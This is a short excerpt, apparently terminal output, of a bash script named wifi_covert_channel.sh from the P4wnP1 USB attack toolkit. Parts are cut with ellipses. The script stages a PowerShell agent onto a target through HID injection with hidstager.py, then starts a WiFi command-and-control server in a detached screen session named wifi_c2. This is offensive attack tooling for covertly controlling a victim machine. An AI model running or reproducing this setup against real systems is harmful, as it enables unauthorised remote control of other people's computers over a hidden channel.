cat scripts/wifi_covert_channel.sh 
#!/bin/bash
...
python2 /usr/local/P4wnP1/legacy/hidstager.py -s -i /usr/local/P4wnP1/legacy/wifi_agent.ps1 -o $hidraw &
...
if ! ps -aux | grep wifi_server | grep -q -v grep; then
        ...
        screen -dmS wifi_c2 bash -c "python2 /usr/local/P4wnP1/legacy/wifi_server.py"
else
